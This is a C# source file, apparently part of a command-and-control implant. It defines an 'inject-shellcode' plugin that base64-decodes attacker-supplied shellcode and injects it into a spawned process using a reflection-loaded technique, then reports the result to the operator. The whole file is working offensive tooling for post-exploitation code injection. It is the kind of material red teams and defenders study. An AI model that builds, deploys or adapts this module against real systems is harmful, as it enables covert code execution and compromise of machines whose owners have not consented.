using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;
using System.Text.Json;
using System.Reflection;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "inject-shellcode";
        private IDataBroker messageManager { get; set; }
        private IServiceConfig config { get; set; }
        private ILogger logger { get; set; }
        private IRuntimeExecutor spawner { get; set; }
        private List<ITechnique> techniques = new List<ITechnique>();
        public Plugin(IDataBroker messageManager, IServiceConfig config, ILogger logger, ICredentialProvider tokenManager, IRuntimeExecutor spawner, IScriptEngine pythonManager)
        {
            this.messageManager = messageManager;
            this.spawner = spawner;
            this.logger = logger;
            this.config = config;
            GetTechniques();
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            InjectArgs args = JsonSerializer.Deserialize<InjectArgs>(job.task.parameters);
            string message = string.Empty;
            if (args is null || !args.Validate(out message))
            {
                DebugLog.Log($"{Name} invalid args: {message} [{job.task.id}]");
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = message,
                    completed = true,
                    status = "error"
                });
                return;
            }

            //Create new process
            byte[] buf = Misc.Base64DecodeToByteArray(args.asm);
            DebugLog.Log($"{Name} shellcode size={buf.Length} [{job.task.id}]");

            SpawnOptions so = args.GetSpawnOptions(job.task.id);
            try
            {
                var technique = techniques.Where(x => x.id == this.config.inject).First();
                if (technique is null)
                {
                    DebugLog.Log($"{Name} technique not found [{job.task.id}]");
                    await WriteDebug("Failed to find technique", job.task.id);
                    return;
                }

                DebugLog.Log($"{Name} injecting with technique {this.config.inject} [{job.task.id}]");
                if(!await technique.Inject(spawner, so, buf))
                {
                    DebugLog.Log($"{Name} injection failed [{job.task.id}]");
                    messageManager.WriteLine("Inject Failed.", job.task.id, true, "error");
                    return;
                }
            }
            catch (Exception e)
            {
                DebugLog.Log($"{Name} exception: {e.Message} [{job.task.id}]");
                await WriteDebug(e.ToString(), job.task.id);
            }
            DebugLog.Log($"{Name} completed [{job.task.id}]");
            return;
        }

        private void GetTechniques()
        {
            Assembly asm = Assembly.GetExecutingAssembly();
            foreach(Type t in asm.GetTypes())
            {
                if (!typeof(ITechnique).IsAssignableFrom(t))
                {
                    continue;
                }
                try
                {
                    var instance = (ITechnique)Activator.CreateInstance(t);
                    if (instance is not null){
                        techniques.Add(instance);
                    }
                }
                catch (MissingMethodException)
                {
                    // Type implements ITechnique but has no parameterless
                    // constructor (e.g. abstract base class)
                    continue;
                }
            }
        }

        private async Task WriteDebug(string message, string task_id){
            if (config.debug)
            {
                this.messageManager.WriteLine(message, task_id, false);
            }
        }
    }
}
